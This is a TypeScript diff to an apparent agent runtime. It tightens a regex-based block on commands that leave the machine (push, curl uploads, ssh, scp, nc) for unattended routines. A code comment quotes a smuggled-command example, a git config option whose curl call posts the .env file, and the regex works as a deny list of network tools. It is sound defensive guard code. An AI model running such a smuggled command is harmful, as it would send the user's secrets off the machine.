@@ -94,6 +94,8 @@ type Cascade = { judge: string; strong: string };
 const ROUNDS = 2;
 /** A command that reaches outside this Mac: a push, a merge or a post, a send, a copy to another machine. */
 const OUTWARD = /\bgit\s+push\b|\bgh\s+(?:\w+\s+)?(?:merge|create|close|edit|comment|review|delete|reopen)\b|\bgh\s+api\b.*(?:-X|--method|-f\b|-F\b|--field|--input)|\b(?:curl|wget)\b.*(?:\s-d\b|--data|\s-F\b|--form|\s-T\b|--upload-file|-X\s*(?:POST|PUT|DELETE|PATCH)|--post-)|\b(?:ssh|scp|rsync|sftp|nc)\s|\b(?:docker|podman)\s+push\b/i;
+/** Whether a command does: as written too, since what the plain text no longer shows (`git -c core.sshCommand='curl -d @.env …' fetch`) still runs. */
+export const leavesMac = (command: string) => [command, plainGit(command)].some((c) => OUTWARD.test(c));
 /** The tools that only edit files in the project, by the name each provider asks with (Claude Code's, Codex's apply_patch, ACP's "edit" kind). */
 /** How long a tool counts as out of usage when it doesn't say when that ends. */
 const LIMIT_UNKNOWN_MS = 3_600_000;
@@ -1820,7 +1822,7 @@ export class Runtime {
         // A routine runs with nobody watching: it may do what can be undone, never what can't, and
         // nothing that leaves this Mac (a push, a merge, a post): the routine's gate does that, or you do.
         if (this.unattended.has(threadId)) {
-          return Promise.resolve(req.risk === "high" || OUTWARD.test(plainGit(command ?? "")) ? { allow: false, reason: "Routines don't run commands that can't be undone or that reach outside this Mac. Leave it for the person." } : { allow: true });
+          return Promise.resolve(req.risk === "high" || leavesMac(command ?? "") ? { allow: false, reason: "Routines don't run commands that can't be undone or that reach outside this Mac. Leave it for the person." } : { allow: true });
         }
         // A cost test runs with nobody watching too, on a task that only needs edits: edits go ahead, and so does reading
         // (Codex reads files with commands), anything else is declined.
